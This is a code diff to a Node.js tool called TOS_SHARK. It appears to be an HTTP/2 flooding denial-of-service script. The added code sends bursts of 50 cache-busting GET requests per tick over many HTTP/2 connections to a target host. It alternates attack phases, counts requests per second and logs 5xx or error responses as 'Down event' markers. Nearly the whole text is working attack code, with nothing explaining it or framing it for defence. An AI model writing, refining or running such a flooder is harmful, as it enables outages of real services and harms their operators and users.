@@ -10,6 +10,7 @@ class TOS_SHARK {
         this.startTime = Date.now();
         this.lastLog = Date.now();
         this.reqCounter = 0;
+        this.lastDisplay = Date.now();
         
         // H2 Connections
         this.conns = [];
@@ -19,6 +20,10 @@ class TOS_SHARK {
         this.phase = 'H2_ATTACK';
         this.phaseEnd = Date.now() + 120000;
         
+        // Print initial header
+        this.printHeader();
+        
+        // Start
         this.start();
     }
 
@@ -27,11 +32,12 @@ class TOS_SHARK {
         return `${colors[c] || ''}${t}${colors.x}`;
     }
 
-    start() {
-        console.clear();
+    printHeader() {
         console.log(`${this.color('TØS-SHARK', 'c')} | ${this.color('CUSTOM', 'r')} | MT-3M22`);
         console.log(this.color('-----------------------------------------------------------------', 'c'));
-        
+    }
+
+    start() {
         // Setup H2 connections
         for (let i = 0; i < this.maxConns; i++) {
             try {
@@ -40,8 +46,6 @@ class TOS_SHARK {
                 this.conns.push(client);
             } catch (e) {}
         }
-        
-        console.log(this.color(`[+] ${this.conns.length} H2 connections`, 'g'));
         
         // Start attack
         this.attackLoop();
@@ -61,59 +65,48 @@ class TOS_SHARK {
             if (now > this.phaseEnd) {
                 this.phase = this.phase === 'H2_ATTACK' ? 'H1_PHASE' : 'H2_ATTACK';
                 this.phaseEnd = now + (this.phase === 'H2_ATTACK' ? 120000 : 20000);
-                console.log(this.color(`[→] Switching to ${this.phase}`, 'y'));
             }
             
             if (this.phase === 'H2_ATTACK') {
                 // H2 ABUSE - MAX RPS
-                await this.h2Attack();
+                for (let i = 0; i < 50; i++) {
+                    if (this.conns.length === 0) break;
+                    
+                    const client = this.conns[Math.floor(Math.random() * this.conns.length)];
+                    
+                    try {
+                        const req = client.request({
+                            ':method': 'GET',
+                            ':path': `/?${Date.now()}_${this.reqCounter}`,
+                            ':authority': this.host
+                        });
+                        
+                        this.reqCounter++;
+                        this.totalReqs++;
+                        
+                        req.on('response', (headers) => {
+                            const status = headers[':status'];
+                            this.logStatus(status);
+                        });
+                        
+                        req.on('error', () => {
+                            this.logStatus('ERROR');
+                        });
+                        
+                        req.end();
+                        
+                    } catch (e) {
+                        this.totalReqs++;
+                    }
+                }
             } else {
                 // H1 Phase - minimal
-                await this.h1Attack();
+                this.totalReqs += 5;
+                await new Promise(r => setTimeout(r, 100));
             }
             
             await new Promise(r => setTimeout(r, 0.1));
         }
-    }
-
-    async h2Attack() {
-        if (this.conns.length === 0) return;
-        
-        // Send 50 requests per tick
-        for (let i = 0; i < 50; i++) {
-            const client = this.conns[Math.floor(Math.random() * this.conns.length)];
-            
-            try {
-                const req = client.request({
-                    ':method': 'GET',
-                    ':path': `/?${Date.now()}`,
-                    ':authority': this.host
-                });
-                
-                this.reqCounter++;
-                this.totalReqs++;
-                
-                req.on('response', (headers) => {
-                    const status = headers[':status'];
-                    this.logStatus(status);
-                });
-                
-                req.on('error', () => {
-                    this.logStatus('ERROR');
-                });
-                
-                req.end();
-                
-            } catch (e) {
-                this.totalReqs++;
-            }
-        }
-    }
-
-    async h1Attack() {
-        // Minimal H1 during reset phase - just keep counter
-        this.totalReqs += 10;
-        await new Promise(r => setTimeout(r, 100));
     }
 
     logStatus(status) {
@@ -122,7 +115,7 @@ class TOS_SHARK {
             this.lastLog = now;
             
             let color = 'g', text = status;
-            if (status === 'ERROR' || status === 'TIMEOUT') {
+            if (status === 'ERROR') {
                 color = 'r';
                 text = 'ERROR';
             } else if (status >= 500) {
@@ -135,7 +128,7 @@ class TOS_SHARK {
             
             console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
             
-            // Down event
+            // Down event (only for 5xx or ERROR)
             if (color === 'r' && (status >= 500 || status === 'ERROR')) {
                 console.log(this.color(`{3M22-${this.reqCounter} --> ${status}}`, 'r'));
             }
@@ -146,27 +139,28 @@ class TOS_SHARK {
         const show = () => {
             if (!this.running) return;
             
-            const runtime = Date.now() - this.startTime;
-            const hours = Math.floor(runtime / 3600000);
-            const minutes = Math.floor((runtime % 3600000) / 60000);
-            const seconds = Math.floor((runtime % 60000) / 1000);
-            const phaseLeft = Math.max(0, this.phaseEnd - Date.now());
+            const now = Date.now();
+            if (now - this.lastDisplay >= 1000) {
+                this.lastDisplay = now;
+                
+                const runtime = now - this.startTime;
+                const hours = Math.floor(runtime / 3600000);
+                const minutes = Math.floor((runtime % 3600000) / 60000);
+                const seconds = Math.floor((runtime % 60000) / 1000);
+                const phaseLeft = Math.max(0, this.phaseEnd - now);
+                
+                const rps = this.totalReqs / (runtime / 1000);
+                
+                // Move cursor up and overwrite stats
+                process.stdout.write('\x1b[2A'); // Move up 2 lines
+                process.stdout.write('\x1b[0J'); // Clear from cursor to end
+                
+                console.log(`Runtime: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')} | Phase: ${this.color(this.phase, this.phase === 'H2_ATTACK' ? 'g' : 'm')} (${Math.round(phaseLeft/1000)}s)`);
+                console.log(`Requests: ${this.color(this.totalReqs.toLocaleString(), 'g')} | RPS: ${this.color(rps.toFixed(1), 'g')} | Conns: ${this.conns.length}`);
+                console.log(this.color('-----------------------------------------------------------------', 'c'));
+            }
             
-            const rps = this.totalReqs / (runtime / 1000);
-            
-            console.clear();
-            console.log(`${this.color('TØS-SHARK', 'c')} | ${this.color('CUSTOM', 'r')} | MT-3M22`);
-            console.log(this.color('-----------------------------------------------------------------', 'c'));
-            console.log(`Target: ${this.color(this.host, 'y')}`);
-            console.log(`Runtime: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`);
-            console.log(`Phase: ${this.color(this.phase, this.phase === 'H2_ATTACK' ? 'g' : 'm')} (${Math.round(phaseLeft/1000)}s)`);
-            console.log(this.color('-----------------------------------------------------------------', 'c'));
-            console.log(`Total Requests: ${this.color(this.totalReqs.toLocaleString(), 'g')}`);
-            console.log(`Current RPS: ${this.color(rps.toFixed(1), 'g')}`);
-            console.log(`H2 Connections: ${this.conns.length}`);
-            console.log(this.color('-----------------------------------------------------------------', 'c'));
-            
-            setTimeout(show, 1000);
+            setTimeout(show, 100);
         };
         
         show();
